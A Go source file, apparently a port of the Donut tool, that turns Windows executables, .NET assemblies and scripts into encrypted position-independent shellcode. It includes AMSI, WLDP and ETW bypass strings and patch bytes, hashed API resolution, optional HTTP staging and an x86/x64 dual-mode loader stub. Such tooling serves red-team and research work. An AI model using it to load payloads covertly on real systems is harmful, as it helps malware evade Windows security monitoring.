package donut

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"strings"
)

// DonutCreate generates shellcode from the given configuration
func DonutCreate(config *DonutConfig) error {
	if config == nil {
		return errors.New("config is nil")
	}

	// Read input file
	data, err := os.ReadFile(config.Input)
	if err != nil {
		return fmt.Errorf("failed to read input file: %w", err)
	}

	if len(data) == 0 {
		return errors.New("input file is empty")
	}

	// Generate shellcode
	shellcode, err := ShellcodeFromBytes(bytes.NewBuffer(data), config)
	if err != nil {
		return err
	}

	// Format output
	output, err := FormatOutput(shellcode.Bytes(), int(config.Format))
	if err != nil {
		return err
	}

	config.Pic = output
	config.PicLen = len(output)

	return nil
}

// DonutDelete cleans up allocated resources
func DonutDelete(config *DonutConfig) {
	if config != nil {
		config.Pic = nil
		config.Inst = nil
		config.Mod = nil
	}
}

// ShellcodeFromFile generates shellcode from a PE file
// Returns *bytes.Buffer for Binject/go-donut API compatibility
func ShellcodeFromFile(inputFile string, config *DonutConfig) (*bytes.Buffer, error) {
	data, err := os.ReadFile(inputFile)
	if err != nil {
		return nil, fmt.Errorf("failed to read input file: %w", err)
	}
	return ShellcodeFromBytes(bytes.NewBuffer(data), config)
}

// ShellcodeFromBytes generates shellcode from PE bytes
// Returns *bytes.Buffer for Binject/go-donut API compatibility
func ShellcodeFromBytes(buf *bytes.Buffer, config *DonutConfig) (*bytes.Buffer, error) {
	if config == nil {
		config = DefaultConfig()
	}

	data := buf.Bytes()

	// Parse PE file
	peInfo, err := ParsePE(data)
	if err != nil {
		// Try detecting as script
		fileType, scriptErr := DetectFileType(data)
		if scriptErr != nil {
			return nil, fmt.Errorf("failed to parse input: %w", err)
		}
		// Handle script types
		return generateScriptShellcode(data, fileType, config)
	}

	// Check for mixed-mode assembly
	if peInfo.IsMixed {
		return nil, errors.New("mixed-mode assemblies are not supported")
	}

	// Set module type
	config.Type = ModuleType(peInfo.Type)

	// Determine target architecture
	// For x84 (dual-mode) or ANY, generate dual-mode shellcode that works on both x86/x64
	// For specific arch (x86 or x64), validate against PE and use that arch
	arch := config.Arch.ToInternal()
	if config.Arch == DonutArch(DONUT_ARCH_ANY) || arch == 0 {
		arch = DONUT_ARCH_X84 // ANY or unspecified means generate dual-mode
	} else if arch == DONUT_ARCH_X86 || arch == DONUT_ARCH_X64 {
		// Validate: can't run x64 PE on x86 target
		if arch == DONUT_ARCH_X86 && peInfo.Arch == DONUT_ARCH_X64 {
			return nil, errors.New("cannot generate x86 shellcode for x64 PE")
		}
	}
	// For DONUT_ARCH_X84, keep it as x84 (dual-mode)

	// Validate .NET parameters
	if peInfo.IsDotNet && peInfo.IsDLL {
		if config.Class == "" || config.Method == "" {
			return nil, errors.New(".NET DLL requires class and method name")
		}
	}

	// Validate DLL function
	if !peInfo.IsDotNet && peInfo.IsDLL && config.Method != "" {
		if !HasExportedFunction(data, config.Method) {
			return nil, fmt.Errorf("DLL does not export function: %s", config.Method)
		}
	}

	// Build module
	mod, err := buildModule(data, peInfo, config)
	if err != nil {
		return nil, fmt.Errorf("failed to build module: %w", err)
	}
	config.Mod = mod

	// Build instance
	inst, err := buildInstance(mod, config)
	if err != nil {
		return nil, fmt.Errorf("failed to build instance: %w", err)
	}
	config.Inst = inst

	// Get appropriate loader
	loader, err := GetLoaderForArch(arch, peInfo.Type)
	if err != nil {
		return nil, err
	}

	// Serialize instance
	instanceBytes, err := serializeInstance(inst, mod, config)
	if err != nil {
		return nil, err
	}

	// Create final shellcode using sandwich pattern
	shellcode := Sandwich(arch, loader, instanceBytes)

	return bytes.NewBuffer(shellcode), nil
}

// generateScriptShellcode handles VBS/JS files
func generateScriptShellcode(data []byte, fileType int, config *DonutConfig) (*bytes.Buffer, error) {
	config.Type = ModuleType(fileType)

	arch := DONUT_ARCH_X64
	if config.Arch == X32 {
		arch = DONUT_ARCH_X86
	}

	// Build module for script
	mod := &DonutModule{
		Type:     int32(fileType),
		Len:      uint32(len(data)),
		Data:     data,
		Compress: int32(config.Compress),
	}

	// Set signature (MAC is set later in serializeInstance using instance's IV)
	sig, _ := RandomBytes(DONUT_SIG_LEN)
	copy(mod.Sig[:], sig)

	config.Mod = mod

	// Build instance
	inst, err := buildInstance(mod, config)
	if err != nil {
		return nil, err
	}
	config.Inst = inst

	// Get loader
	loader, err := GetLoaderForArch(arch, fileType)
	if err != nil {
		return nil, err
	}

	// Serialize
	instanceBytes, err := serializeInstance(inst, mod, config)
	if err != nil {
		return nil, err
	}

	// Create final shellcode using sandwich pattern
	return bytes.NewBuffer(Sandwich(arch, loader, instanceBytes)), nil
}

// buildModule creates a DonutModule from the input file
func buildModule(data []byte, peInfo *PEInfo, config *DonutConfig) (*DonutModule, error) {
	// Compress data if requested
	moduleData := data
	compressedLen := uint32(0)

	if config.Compress != uint32(DONUT_COMPRESS_NONE) {
		compressed, err := CompressData(data, int(config.Compress))
		if err == nil && len(compressed) < len(data) {
			moduleData = compressed
			compressedLen = uint32(len(compressed))
		}
	}

	mod := &DonutModule{
		Type:     int32(peInfo.Type),
		Thread:   int32(config.Thread),
		Compress: int32(config.Compress),
		Len:      uint32(len(data)),
		Zlen:     compressedLen,
		Data:     moduleData,
	}

	// Set .NET specific fields
	if peInfo.IsDotNet {
		runtime := config.Runtime
		if runtime == "" {
			runtime = peInfo.CLRVersion
		}
		if runtime == "" {
			runtime = DONUT_RUNTIME_NET4
		}
		copy(mod.Runtime[:], runtime)

		domain := config.Domain
		if domain == "" && config.Entropy >= DONUT_ENTROPY_RANDOM {
			domain = randomString(8)
		}
		copy(mod.Domain[:], domain)

		if config.Class != "" {
			copy(mod.Cls[:], config.Class)
		}
		if config.Method != "" {
			copy(mod.Method[:], config.Method)
		}
	} else if peInfo.IsDLL && config.Method != "" {
		// Unmanaged DLL function
		copy(mod.Method[:], config.Method)
	}

	// Set arguments
	if config.Parameters != "" {
		copy(mod.Args[:], config.Parameters)
		if config.Unicode != 0 {
			mod.Unicode = 1
		}
	}

	// Generate signature for module verification (used for HTTP staging)
	sig, err := RandomBytes(DONUT_SIG_LEN)
	if err != nil {
		return nil, err
	}
	copy(mod.Sig[:], sig)
	// Note: mod.Mac is set later in serializeInstance using instance's IV

	return mod, nil
}

// buildInstance creates a DonutInstance
func buildInstance(mod *DonutModule, config *DonutConfig) (*DonutInstance, error) {
	inst := &DonutInstance{
		ExitOpt: int32(config.ExitOpt),
		Entropy: int32(config.Entropy),
		OEP:     config.OEP,
		Bypass:  int32(config.Bypass),
		Headers: int32(config.Headers),
		Type:    int32(config.InstType),
		Module:  mod,
	}

	// Only generate random IV and keys when encryption is enabled (DONUT_ENTROPY_DEFAULT = 3)
	if config.Entropy == DONUT_ENTROPY_DEFAULT {
		// Generate IV for Maru hash
		ivBytes, err := RandomBytes(DONUT_IV_LEN)
		if err != nil {
			return nil, err
		}
		inst.IV = binary.LittleEndian.Uint64(ivBytes)

		// Generate encryption keys
		keyBytes, err := RandomBytes(DONUT_KEY_LEN)
		if err != nil {
			return nil, err
		}
		copy(inst.Key.MasterKey[:], keyBytes)

		ctrBytes, err := RandomBytes(DONUT_BLK_LEN)
		if err != nil {
			return nil, err
		}
		copy(inst.Key.Counter[:], ctrBytes)

		// Module encryption key
		modKeyBytes, err := RandomBytes(DONUT_KEY_LEN)
		if err != nil {
			return nil, err
		}
		copy(inst.ModKey.MasterKey[:], modKeyBytes)

		modCtrBytes, err := RandomBytes(DONUT_BLK_LEN)
		if err != nil {
			return nil, err
		}
		copy(inst.ModKey.Counter[:], modCtrBytes)

		// Instance signature (random when entropy enabled)
		instSig, err := RandomBytes(DONUT_SIG_LEN)
		if err != nil {
			return nil, err
		}
		copy(inst.Sig[:], instSig)
		inst.Mac = Maru(instSig, inst.IV)
	} else {
		// No encryption - IV stays 0, keys stay 0, no signature verification
		inst.IV = 0
	}

	// Set GUIDs
	SetInstanceGUIDs(inst)
	if mod.Type == int32(DONUT_MODULE_VBS) || mod.Type == int32(DONUT_MODULE_JS) {
		SetScriptGUID(inst, int(mod.Type))
	}

	// Set DLL names for API resolution - format matches original donut
	copy(inst.DllNames[:], "ole32;oleaut32;wininet;mscoree;shell32")

	// Set string constants
	copy(inst.Dataname[:], ".data")
	copy(inst.Kernelbase[:], "kernelbase")
	copy(inst.Amsi[:], "amsi")
	copy(inst.Clr[:], "clr")
	copy(inst.Wldp[:], "wldp")
	copy(inst.Ntdll[:], "ntdll")

	// Headers option
	inst.Headers = int32(config.Headers)

	// Set bypass strings
	copy(inst.WldpQuery[:], "WldpQueryDynamicCodeTrust")
	copy(inst.WldpIsApproved[:], "WldpIsClassInApprovedList")
	copy(inst.AmsiInit[:], "AmsiInitialize")
	copy(inst.AmsiScanBuf[:], "AmsiScanBuffer")
	copy(inst.AmsiScanStr[:], "AmsiScanString")
	copy(inst.EtwEventWrite[:], "EtwEventWrite")
	copy(inst.EtwEventUnreg[:], "EtwEventUnregister")

	// ETW bypass instructions
	inst.EtwRet64[0] = 0xC3                                // ret
	copy(inst.EtwRet32[:], []byte{0xC2, 0x14, 0x00, 0x00}) // ret 14h

	// WScript strings for script execution
	copy(inst.Wscript[:], "WScript")
	copy(inst.WscriptExe[:], "wscript.exe")

	// Set command line symbols
	cmdSyms := "__p___argv;__p___argc;_acmdln;_wcmdln;__argv;__argc;__wargv"
	copy(inst.CmdSyms[:], cmdSyms)

	// Set exit API symbols
	exitApi := "ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit"
	copy(inst.ExitApi[:], exitApi)

	// HTTP staging
	if config.InstType == DONUT_INSTANCE_URL {
		if config.Server == "" {
			return nil, errors.New("HTTP staging requires server URL")
		}
		copy(inst.Server[:], config.Server)
		if config.Auth != "" {
			parts := strings.SplitN(config.Auth, ":", 2)
			if len(parts) == 2 {
				copy(inst.Username[:], parts[0])
				copy(inst.Password[:], parts[1])
			}
		}
		copy(inst.HttpReq[:], "GET")
	}

	// Decoy module
	if config.Decoy != "" {
		copy(inst.Decoy[:], config.Decoy)
	}

	// Calculate API hashes - use XOR of DLL hash and API name hash
	// IV=0 when no encryption, so hashes are consistent
	inst.ApiCnt = int32(len(apiList))
	for i, api := range apiList {
		dllHash := MaruStr(api.dll, inst.IV)
		apiHash := MaruStr(api.name, inst.IV)
		inst.Hash[i] = dllHash ^ apiHash
	}

	return inst, nil
}

// serializeInstance converts instance and module to bytes
// This follows the exact layout from donut v1.1
func serializeInstance(inst *DonutInstance, mod *DonutModule, config *DonutConfig) ([]byte, error) {
	buf := new(bytes.Buffer)

	// Set module MAC using instance's signature and IV (for HTTP staging verification)
	// For embedded mode this isn't used, but we set it anyway for consistency
	mod.Mac = Maru(inst.Sig[:DONUT_SIG_LEN], inst.IV)

	// Serialize module (DONUT_MODULE structure)
	modBuf := new(bytes.Buffer)
	binary.Write(modBuf, binary.LittleEndian, int32(mod.Type))     // int type
	binary.Write(modBuf, binary.LittleEndian, int32(mod.Thread))   // int thread
	binary.Write(modBuf, binary.LittleEndian, int32(mod.Compress)) // int compress
	modBuf.Write(mod.Runtime[:])                                   // char runtime[256]
	modBuf.Write(mod.Domain[:])                                    // char domain[256]
	modBuf.Write(mod.Cls[:])                                       // char cls[256]
	modBuf.Write(mod.Method[:])                                    // char method[256]
	modBuf.Write(mod.Args[:])                                      // char args[256]
	binary.Write(modBuf, binary.LittleEndian, int32(mod.Unicode))  // int unicode
	modBuf.Write(mod.Sig[:])                                       // char sig[8]
	binary.Write(modBuf, binary.LittleEndian, mod.Mac)             // uint64_t mac
	binary.Write(modBuf, binary.LittleEndian, mod.Zlen)            // uint32_t zlen
	binary.Write(modBuf, binary.LittleEndian, mod.Len)             // uint32_t len
	modBuf.Write(mod.Data)                                         // uint8_t data[]

	moduleData := modBuf.Bytes()
	inst.ModLen = uint64(len(moduleData))

	// Write instance header (unencrypted portion)
	// Donut 1.1 uses NATURAL alignment (not packed), so iv must be 8-byte aligned
	// Layout: len(4) + key.mk(16) + key.ctr(16) + pad(4) + iv(8) + hash[64](512) + exit_opt(4) + entropy(4) + oep(4)
	binary.Write(buf, binary.LittleEndian, uint32(0)) // len placeholder (offset 0x00)
	buf.Write(inst.Key.MasterKey[:])                  // uint8_t mk[16] (offset 0x04)
	buf.Write(inst.Key.Counter[:])                    // uint8_t ctr[16] (offset 0x14)
	binary.Write(buf, binary.LittleEndian, uint32(0)) // padding for 8-byte alignment (offset 0x24)
	binary.Write(buf, binary.LittleEndian, inst.IV)   // uint64_t iv (offset 0x28)

	// Write API hashes - uint64_t hash[64] (offset 0x30, ends at 0x22f)
	for i := 0; i < 64; i++ {
		binary.Write(buf, binary.LittleEndian, inst.Hash[i])
	}

	binary.Write(buf, binary.LittleEndian, inst.ExitOpt) // int exit_opt (offset 0x230)
	binary.Write(buf, binary.LittleEndian, inst.Entropy) // int entropy (offset 0x234)
	binary.Write(buf, binary.LittleEndian, inst.OEP)     // uint32_t oep (offset 0x238)

	// Encrypted portion starts here (offset 0x23c)
	encBuf := new(bytes.Buffer)

	binary.Write(encBuf, binary.LittleEndian, inst.ApiCnt) // int api_cnt
	encBuf.Write(inst.DllNames[:])                         // char dll_names[256]

	encBuf.Write(inst.Dataname[:])   // char dataname[8]
	encBuf.Write(inst.Kernelbase[:]) // char kernelbase[12]
	encBuf.Write(inst.Amsi[:])       // char amsi[8]
	encBuf.Write(inst.Clr[:])        // char clr[4]
	encBuf.Write(inst.Wldp[:])       // char wldp[8]
	encBuf.Write(inst.Ntdll[:])      // char ntdll[8]

	encBuf.Write(inst.CmdSyms[:]) // char cmd_syms[256]
	encBuf.Write(inst.ExitApi[:]) // char exit_api[256]

	binary.Write(encBuf, binary.LittleEndian, inst.Bypass)  // int bypass
	binary.Write(encBuf, binary.LittleEndian, inst.Headers) // int headers

	encBuf.Write(inst.WldpQuery[:])      // char wldpQuery[32]
	encBuf.Write(inst.WldpIsApproved[:]) // char wldpIsApproved[32]
	encBuf.Write(inst.AmsiInit[:])       // char amsiInit[16]
	encBuf.Write(inst.AmsiScanBuf[:])    // char amsiScanBuf[16]
	encBuf.Write(inst.AmsiScanStr[:])    // char amsiScanStr[16]
	encBuf.Write(inst.EtwEventWrite[:])  // char etwEventWrite[16]
	encBuf.Write(inst.EtwEventUnreg[:])  // char etwEventUnregister[20]
	encBuf.Write(inst.EtwRet64[:])       // char etwRet64[1]
	encBuf.Write(inst.EtwRet32[:])       // char etwRet32[4]

	encBuf.Write(inst.Wscript[:])    // char wscript[8]
	encBuf.Write(inst.WscriptExe[:]) // char wscript_exe[12]

	encBuf.Write(inst.Decoy[:]) // char decoy[MAX_PATH * 2] = 520

	// Padding for GUID alignment (GUIDs need 4-byte alignment, decoy ends at odd offset)
	// After decoy at offset 0x5f1, we need 3 bytes padding to reach 0x5f4
	encBuf.Write([]byte{0, 0, 0}) // 3-byte padding for GUID alignment

	// Write GUIDs (16 bytes each)
	writeGUID(encBuf, inst.XIID_IUnknown)
	writeGUID(encBuf, inst.XIID_IDispatch)
	writeGUID(encBuf, inst.XCLSID_CLRMetaHost)
	writeGUID(encBuf, inst.XIID_ICLRMetaHost)
	writeGUID(encBuf, inst.XIID_ICLRRuntimeInfo)
	writeGUID(encBuf, inst.XCLSID_CorRuntimeHost)
	writeGUID(encBuf, inst.XIID_ICorRuntimeHost)
	writeGUID(encBuf, inst.XIID_AppDomain)
	writeGUID(encBuf, inst.XCLSID_ScriptLanguage)
	writeGUID(encBuf, inst.XIID_IHost)
	writeGUID(encBuf, inst.XIID_IActiveScript)
	writeGUID(encBuf, inst.XIID_IActiveScriptSite)
	writeGUID(encBuf, inst.XIID_IActiveScriptSiteWindow)
	writeGUID(encBuf, inst.XIID_IActiveScriptParse32)
	writeGUID(encBuf, inst.XIID_IActiveScriptParse64)

	binary.Write(encBuf, binary.LittleEndian, inst.Type) // int type
	encBuf.Write(inst.Server[:])                         // char server[256]
	encBuf.Write(inst.Username[:])                       // char username[256]
	encBuf.Write(inst.Password[:])                       // char password[256]
	encBuf.Write(inst.HttpReq[:])                        // char http_req[8]
	encBuf.Write(inst.Sig[:])                            // uint8_t sig[256]

	// Padding for mac alignment (uint64_t needs 8-byte alignment)
	// sig ends at relative offset 0xaf0, mac should be at 0xaf4, need 4 bytes padding
	encBuf.Write([]byte{0, 0, 0, 0}) // 4-byte padding for mac alignment

	binary.Write(encBuf, binary.LittleEndian, inst.Mac)    // uint64_t mac
	encBuf.Write(inst.ModKey.MasterKey[:])                 // uint8_t mk[16]
	encBuf.Write(inst.ModKey.Counter[:])                   // uint8_t ctr[16]
	binary.Write(encBuf, binary.LittleEndian, inst.ModLen) // uint64_t mod_len

	// For EMBED mode, append module data to encrypted section BEFORE encrypting
	// For HTTP mode, module is encrypted separately and stored on server
	if config.InstType == DONUT_INSTANCE_PIC {
		encBuf.Write(moduleData)
	}

	// Encrypt the entire encrypted section (including embedded module) if needed
	encData := encBuf.Bytes()
	if config.Entropy >= DONUT_ENTROPY_DEFAULT {
		encData = EncryptCTR(inst.Key.MasterKey[:], inst.Key.Counter[:], encData)
	}

	buf.Write(encData)

	// Update length
	result := buf.Bytes()
	binary.LittleEndian.PutUint32(result[0:4], uint32(len(result)))
	inst.Len = uint32(len(result))

	return result, nil
}

func writeGUID(buf *bytes.Buffer, g GUID) {
	binary.Write(buf, binary.LittleEndian, g.Data1)
	binary.Write(buf, binary.LittleEndian, g.Data2)
	binary.Write(buf, binary.LittleEndian, g.Data3)
	buf.Write(g.Data4[:])
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b, _ := RandomBytes(n)
	result := make([]byte, n)
	for i := range result {
		result[i] = letters[int(b[i])%len(letters)]
	}
	return string(result)
}

// API list for hash generation
type apiEntry struct {
	dll  string
	name string
}

var apiList = []apiEntry{
	{KERNEL32_DLL, "LoadLibraryA"},
	{KERNEL32_DLL, "GetProcAddress"},
	{KERNEL32_DLL, "GetModuleHandleA"},
	{KERNEL32_DLL, "VirtualAlloc"},
	{KERNEL32_DLL, "VirtualFree"},
	{KERNEL32_DLL, "VirtualQuery"},
	{KERNEL32_DLL, "VirtualProtect"},
	{KERNEL32_DLL, "Sleep"},
	{KERNEL32_DLL, "MultiByteToWideChar"},
	{KERNEL32_DLL, "GetUserDefaultLCID"},
	{KERNEL32_DLL, "WaitForSingleObject"},
	{KERNEL32_DLL, "CreateThread"},
	{KERNEL32_DLL, "CreateFileA"},
	{KERNEL32_DLL, "GetFileSizeEx"},
	{KERNEL32_DLL, "GetThreadContext"},
	{KERNEL32_DLL, "GetCurrentThread"},
	{KERNEL32_DLL, "GetCurrentProcess"},
	{KERNEL32_DLL, "GetCommandLineA"},
	{KERNEL32_DLL, "GetCommandLineW"},
	{KERNEL32_DLL, "HeapAlloc"},
	{KERNEL32_DLL, "HeapReAlloc"},
	{KERNEL32_DLL, "GetProcessHeap"},
	{KERNEL32_DLL, "HeapFree"},
	{KERNEL32_DLL, "GetLastError"},
	{KERNEL32_DLL, "CloseHandle"},
	{SHELL32_DLL, "CommandLineToArgvW"},
	{OLEAUT32_DLL, "SafeArrayCreate"},
	{OLEAUT32_DLL, "SafeArrayCreateVector"},
	{OLEAUT32_DLL, "SafeArrayPutElement"},
	{OLEAUT32_DLL, "SafeArrayDestroy"},
	{OLEAUT32_DLL, "SafeArrayGetLBound"},
	{OLEAUT32_DLL, "SafeArrayGetUBound"},
	{OLEAUT32_DLL, "SysAllocString"},
	{OLEAUT32_DLL, "SysFreeString"},
	{OLEAUT32_DLL, "LoadTypeLib"},
	{WININET_DLL, "InternetCrackUrlA"},
	{WININET_DLL, "InternetOpenA"},
	{WININET_DLL, "InternetConnectA"},
	{WININET_DLL, "InternetSetOptionA"},
	{WININET_DLL, "InternetReadFile"},
	{WININET_DLL, "InternetQueryDataAvailable"},
	{WININET_DLL, "InternetCloseHandle"},
	{WININET_DLL, "HttpOpenRequestA"},
	{WININET_DLL, "HttpSendRequestA"},
	{WININET_DLL, "HttpQueryInfoA"},
	{MSCOREE_DLL, "CorBindToRuntime"},
	{MSCOREE_DLL, "CLRCreateInstance"},
	{OLE32_DLL, "CoInitializeEx"},
	{OLE32_DLL, "CoCreateInstance"},
	{OLE32_DLL, "CoUninitialize"},
	{NTDLL_DLL, "RtlEqualUnicodeString"},
	{NTDLL_DLL, "RtlEqualString"},
	{NTDLL_DLL, "RtlUnicodeStringToAnsiString"},
	{NTDLL_DLL, "RtlInitUnicodeString"},
	{NTDLL_DLL, "RtlExitUserThread"},
	{NTDLL_DLL, "RtlExitUserProcess"},
	{NTDLL_DLL, "RtlCreateUnicodeString"},
	{NTDLL_DLL, "RtlGetCompressionWorkSpaceSize"},
	{NTDLL_DLL, "RtlDecompressBuffer"},
	{NTDLL_DLL, "NtContinue"},
	{NTDLL_DLL, "NtCreateSection"},
	{NTDLL_DLL, "NtMapViewOfSection"},
	{NTDLL_DLL, "NtUnmapViewOfSection"},
}

// Sandwich creates the final shellcode by wrapping instance data with
// call/pop instructions that pass the instance pointer to the loader.
// Structure: E8 [len] [instance] 59 [preamble] [loader]
func Sandwich(arch int, loader, instanceData []byte) []byte {
	buf := new(bytes.Buffer)
	instanceLen := uint32(len(instanceData))

	// RSP alignment stub for x64 - ensures 16-byte alignment for Microsoft x64 calling convention
	loaderX64RspAlign := []byte{
		0x55,             // push rbp
		0x48, 0x89, 0xE5, // mov rbp, rsp
		0x48, 0x83, 0xE4, 0xF0, // and rsp, -0x10
		0x48, 0x83, 0xEC, 0x20, // sub rsp, 0x20
		0xE8, 0x05, 0x00, 0x00, 0x00, // call $+5
		0x48, 0x89, 0xEC, // mov rsp, rbp
		0x5D, // pop rbp
		0xC3, // ret
	}

	// E8 = call instruction (pushes return address onto stack)
	buf.WriteByte(0xE8)
	binary.Write(buf, binary.LittleEndian, instanceLen)

	// Write instance data
	buf.Write(instanceData)

	// Pop the instance pointer into appropriate register
	buf.WriteByte(0x59) // pop ecx/rcx

	switch arch {
	case DONUT_ARCH_X86:
		// pop edx; push ecx; push edx
		buf.WriteByte(0x5A) // pop edx
		buf.WriteByte(0x51) // push ecx
		buf.WriteByte(0x52) // push edx
		buf.Write(loader)

	case DONUT_ARCH_X64:
		// x64: RSP alignment stub + loader
		buf.Write(loaderX64RspAlign)
		buf.Write(loader)

	case DONUT_ARCH_X84:
		// Dual-mode stub: detect x64 at runtime using 0x48 prefix trick
		// In x64, 0x48 is REX.W prefix (modifies next instruction)
		// In x86, 0x48 is dec eax (decrements eax, sets SF if negative)

		// xor eax, eax - set eax = 0
		buf.WriteByte(0x31)
		buf.WriteByte(0xC0)
		// 0x48 - In x86: dec eax (eax becomes -1, SF=1)
		//        In x64: REX.W prefix (ignored for xor, eax stays 0, SF=0)
		buf.WriteByte(0x48)
		// js dword [skip to x86 code] - jump if SF=1 (x86 path)
		buf.WriteByte(0x0F)
		buf.WriteByte(0x88)
		// Jump offset: skip RSP align stub + x64 loader
		binary.Write(buf, binary.LittleEndian, uint32(len(loaderX64RspAlign)+len(LOADER_EXE_X64)))

		// x64 code path (SF=0, no jump): RSP alignment + x64 loader
		buf.Write(loaderX64RspAlign)
		buf.Write(LOADER_EXE_X64)

		// x86 code path (jumped here): set up stack and run x86 loader
		buf.WriteByte(0x5A) // pop edx (get return address)
		buf.WriteByte(0x51) // push ecx (instance pointer)
		buf.WriteByte(0x52) // push edx (return address back)
		buf.Write(LOADER_EXE_X86)
	}

	return buf.Bytes()
}
